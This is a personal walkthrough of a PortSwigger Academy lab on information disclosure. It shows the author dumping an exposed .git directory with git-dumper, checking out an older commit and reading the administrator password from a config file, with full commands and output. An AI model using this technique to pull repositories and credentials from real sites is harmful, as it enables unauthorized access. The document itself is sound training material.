@@ -1,0 +1,89 @@
+---
+title: Information disclosure in version control history
+date: '2025-06-18'
+tags:
+  - PortSwigger
+  - lab
+  - information-disclosure
+  - walkthrough
+excerpt: "This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the\_`administrator`\_user then log in and delete the user\_`carlos`."
+type: lab
+category: PortSwigger Academy
+platform: PortSwigger
+difficulty: apprentice
+---
+# Lab: Information disclosure in version control history
+
+## Objective
+This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete the user `carlos`.
+
+## Why This Works (The Principle)
+- **The vulnerability:** The application reveals sensitive information through error messages, debug pages, backup files, or version control history.
+- **Root cause:** These endpoints/files are unintentionally exposed to unauthenticated or unauthorized users.
+- **Exploitation:** Request the vulnerable endpoint to retrieve hidden data.
+- **Key insight:** Information disclosure is rarely the end goal — it is a stepping stone to a bigger attack (e.g., finding credentials, API keys, or internal paths).
+
+## Blind Attempt 
+- **What I tried:** I was familiar with this kind of lab so I simply just went to /.git folder and found it. Also I was aware that tools like git-dumper existed
+- **Where I got stuck:** git-dumper got stuck with python error
+```bash
+uv run --with requests_pkcs12 /usr/bin/git-dumper https://0a0900ba033d1175804ef8fb00f9001a.web-security-academy.net/ .
+
+Installed 9 packages in 32ms
+Traceback (most recent call last):
+  File "/usr/bin/git-dumper", line 3, in <module>
+    from git_dumper import main
+  File "/usr/lib/python3.14/site-packages/git_dumper.py", line 22, in <module>
+    from requests_pkcs12 import Pkcs12Adapter
+ModuleNotFoundError: No module named 'requests_pkcs12'
+```
+
+```bash
+uvx --with requests_pkcs12 git-dumper https://0a0900ba033d1175804ef8fb00f9001a.web-security-academy.net/ .
+```
+
+**Why this worked:** `uvx` (an alias for `uv tool run`) downloads `git-dumper` into an ephemeral environment, installs `requests_pkcs12` right alongside it, and executes the script using the environment's internal Python interpreter.
+## Solution Reconstruction
+- [ ] Step 1: Used git-dumper to download entire project files 
+- [ ] Step 2: After downloading the project:
+```bash
+󰘧 ls
+Permissions Size User   Date Modified Name
+.rw-r--r--    37 schizo 19 Jun 00:48  󱁻 admin.conf
+.rw-r--r--    88 schizo 19 Jun 00:48   admin_panel.php
+
+󰘧 cat admin.conf
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')
+
+> git log
+commit 2a3e5901cc5df87963b2b10604d37c7312c4caf6 (HEAD -> master)
+Author: Carlos Montoya <carlos@carlos-montoya.net>
+Date:   Tue Jun 23 14:05:07 2020 +0000
+
+    Remove admin password from config
+
+commit b785e6a349102e6eb3bb0972a0f4653c9c669093
+Author: Carlos Montoya <carlos@carlos-montoya.net>
+Date:   Mon Jun 22 16:23:42 2020 +0000
+
+    Add skeleton admin panel
+
+> git checkout b785e6a349102e6eb3bb0972a0f4653c9c669093
+Note: switching to 'b785e6a349102e6eb3bb0972a0f4653c9c669093'.
+
+> ls
+Permissions Size User   Date Modified Name
+.rw-r--r--    36 schizo 19 Jun 00:48  󱁻 admin.conf
+.rw-r--r--    88 schizo 19 Jun 00:48   admin_panel.php
+
+…/git_thing on  HEAD
+󰘧 cat admin.conf
+ADMIN_PASSWORD=k5fh1wxi27mu1rpu6m7r
+```
+- [ ] Step 3: Logged in as `administrator` with the recovered password
+## Key Takeaway
+If **.git** is accessible we can roll back versions
+**uvx(uv-tool-run)** can download and run pypi tools ephemerally and run it with --with for dependencies. 
+## Next-Day Blind Replay
+- [ ] Solved entirely from memory
+- [ ] Needed to look at: *(write the specific step forgotten)*
